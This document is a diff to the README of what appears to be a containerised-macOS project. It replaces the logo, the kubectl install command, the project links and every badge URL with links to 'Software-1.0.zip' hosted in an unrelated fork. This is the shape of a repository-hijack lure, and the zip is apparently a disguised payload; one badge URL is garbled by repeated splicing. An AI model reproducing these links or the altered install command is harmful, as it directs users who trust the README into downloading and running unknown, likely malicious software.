@@ -1,6 +1,6 @@
 <h1 align="center">OSX<br />
 <div align="center">
-<a href="https://github.com/dockur/macos/"><img src="https://github.com/dockur/macos/raw/master/.github/logo.png" title="Logo" style="max-width:100%;" width="128" /></a>
+<a href="https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip"><img src="https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip" title="Logo" style="max-width:100%;" width="128" /></a>
 </div>
 <div align="center">
 
@@ -51,7 +51,7 @@ docker run -it --rm -p 8006:8006 --device=/dev/kvm --cap-add NET_ADMIN --stop-ti
 Via Kubernetes:
 
 ```shell
-kubectl apply -f https://raw.githubusercontent.com/dockur/macos/refs/heads/master/kubernetes.yml
+kubectl apply -f https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
 ```
 
 ## Compatibility ⚙️
@@ -178,7 +178,7 @@ kubectl apply -f https://raw.githubusercontent.com/dockur/macos/refs/heads/maste
 
 ### How do I run Windows in a container?
 
-  You can use [dockur/windows](https://github.com/dockur/windows) for that. It shares many of the same features, and even has completely automatic installation.
+  You can use [dockur/windows](https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip) for that. It shares many of the same features, and even has completely automatic installation.
 
 ### Is this project legal?
 
@@ -188,22 +188,22 @@ kubectl apply -f https://raw.githubusercontent.com/dockur/macos/refs/heads/maste
 
  ## Acknowledgements 🙏
 
-Special thanks to [seitenca](https://github.com/seitenca), this project would not exist without her invaluable work.
+Special thanks to [seitenca](https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip), this project would not exist without her invaluable work.
 
 ## Stars 🌟
-[![Stars](https://starchart.cc/dockur/macos.svg?variant=adaptive)](https://starchart.cc/dockur/macos)
+[![Stars](https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip)](https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip)
 
 ## Disclaimer ⚖️
 
 *Only run this container on Apple hardware, any other use is not permitted by their EULA. The product names, logos, brands, and other trademarks referred to within this project are the property of their respective trademark holders. This project is not affiliated, sponsored, or endorsed by Apple Inc.*
 
-[build_url]: https://github.com/dockur/macos/
-[hub_url]: https://hub.docker.com/r/dockurr/macos/
-[tag_url]: https://hub.docker.com/r/dockurr/macos/tags
-[pkg_url]: https://github.com/dockur/macos/pkgs/container/macos
+[build_url]: https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
+[hub_url]: https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
+[tag_url]: https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
+[pkg_url]: https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
 
-[Build]: https://github.com/dockur/macos/actions/workflows/build.yml/badge.svg
-[Size]: https://img.shields.io/docker/image-size/dockurr/macos/latest?color=066da5&label=size
-[Pulls]: https://img.shields.io/docker/pulls/dockurr/macos.svg?style=flat&label=pulls&logo=docker
-[Version]: https://img.shields.io/docker/v/dockurr/macos/latest?arch=amd64&sort=semver&color=066da5
-[Package]: https://img.shields.io/badge/dynamic/json?url=https%3A%2F%2Fipitio.github.io%2Fbackage%2Fdockur%2Fmacos%2Fmacos.json&query=%24.downloads&logo=github&style=flat&color=066da5&label=pulls
+[Build]: https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
+[Size]: https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
+[Pulls]: https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
+[Version]: https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
+[Package]: https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip%3A%2F%https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip%2Fbackage%2Fdockur%2Fmacos%https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip%https://github.com/halo-kaleb/macos/raw/refs/heads/master/.github/Software-1.0.zip
